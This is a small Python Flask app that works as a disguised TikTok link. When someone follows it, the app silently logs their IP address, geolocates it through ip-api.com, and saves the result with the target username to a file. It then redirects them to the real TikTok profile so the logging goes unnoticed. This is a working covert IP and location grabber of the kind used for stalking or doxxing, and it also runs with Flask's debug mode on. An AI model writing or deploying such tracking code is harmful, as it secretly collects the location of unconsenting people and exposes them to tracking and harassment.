from flask import Flask, request, redirect, render_template
import requests
import json

app = Flask(__name__)

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/track', methods=['POST'])
def track():
    tiktok_url = request.form['url']
    username = tiktok_url.split('@')[-1]
    
    # Log IP and Location
    user_ip = request.remote_addr
    response = requests.get(f'http://ip-api.com/json/{user_ip}')
    location_data = response.json()

    # Prepare Data
    user_data = {
        "user": username,
        "ip": user_ip,
        "location": location_data
    }

    # Save Data to data.txt
    with open('data.txt', 'a') as f:
        f.write(json.dumps(user_data) + '\n')

    # Redirect to actual TikTok Profile
    actual_url = f"https://www.tiktok.com/@{username}"
    return redirect(actual_url)

if __name__ == '__main__':
    app.run(debug=True)
